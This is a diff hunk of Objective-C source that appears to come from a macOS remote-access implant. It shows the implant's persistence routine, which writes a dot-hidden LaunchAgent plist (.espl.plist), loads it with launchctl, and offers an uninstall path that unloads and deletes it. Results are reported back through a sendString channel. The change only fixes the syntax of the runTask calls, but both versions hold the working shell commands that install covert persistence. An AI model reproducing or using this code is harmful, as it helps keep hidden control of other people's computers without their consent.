@@ -628,10 +628,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
             [self sendString:[NSString stringWithFormat:@"%@",err.localizedDescription]];
         }
         [plistData writeToFile:esplPath atomically:true];
-        [self runTask:@"sleep 1;launchctl unload ~/Library/LaunchAgents/.espl.plist;launchctl load ~/Library/LaunchAgents/.espl.plist":false];
+        [self runTask:@"sleep 1;launchctl unload ~/Library/LaunchAgents/.espl.plist;launchctl load ~/Library/LaunchAgents/.espl.plist" sendTerminal:false];
     } else if ([args isEqualToString:@"uninstall"]) {
         if ([self.fileManager fileExistsAtPath:esplPath]) {
-            [self runTask:@"launchctl unload ~/Library/LaunchAgents/.espl.plist 2>/dev/null; rm ~/Library/LaunchAgents/.espl.plist":false];
+            [self runTask:@"launchctl unload ~/Library/LaunchAgents/.espl.plist 2>/dev/null; rm ~/Library/LaunchAgents/.espl.plist" sendTerminal:false];
         }
     } else {
         [self sendString:@"Unknown Option"];
